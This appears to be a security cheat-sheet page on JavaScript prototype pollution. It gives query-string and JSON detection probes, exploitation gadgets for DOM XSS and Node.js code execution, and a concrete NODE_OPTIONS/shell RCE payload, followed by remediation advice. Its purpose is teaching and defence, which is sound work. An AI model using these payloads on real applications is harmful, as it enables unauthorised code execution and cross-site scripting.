---
tags:
  - Web
---

# :material-language-javascript: Prototype Pollution

<span class="pill pill-hard">JS gadget</span> <span class="pill pill-info">web</span>

In JavaScript, polluting `Object.prototype` injects properties into *every* object. Depending on the sink, that means client-side XSS or server-side (Node) RCE.

!!! abstract "TL;DR"
    Find a merge/clone/`JSON.parse`-into-object that walks keys without blocking `__proto__`. Set `__proto__.x` and see if a fresh object suddenly has `x`.

## :material-magnify: Detect

=== "Client-side"

    ```
    ?__proto__[test]=hijacked
    ?constructor[prototype][test]=hijacked
    ```
    Then in console: `({}).test === 'hijacked'`.

=== "Server-side (JSON)"

    ```json
    { "__proto__": { "polluted": true } }
    ```

## :material-fire: Exploitation

- **DOM XSS gadget** — pollute a property a library reads into `innerHTML`/`src` (e.g. jQuery `$.extend`, sanitizer config).
- **Node RCE gadget** — pollute options consumed by `child_process` (e.g. `NODE_OPTIONS`, `shell`, `env`) to run code.

```json
{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
```

## :material-shield-check: Remediation

- Reject `__proto__` / `constructor` / `prototype` keys during merge; use `Map` or `Object.create(null)`.
- `Object.freeze(Object.prototype)`; keep libraries (lodash, jQuery) patched.

## :material-link-variant: Related

- A delivery vehicle for [XSS](xss.md) and, on Node, [Command Injection](command-injection.md)-style RCE.
- Reference: [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution).
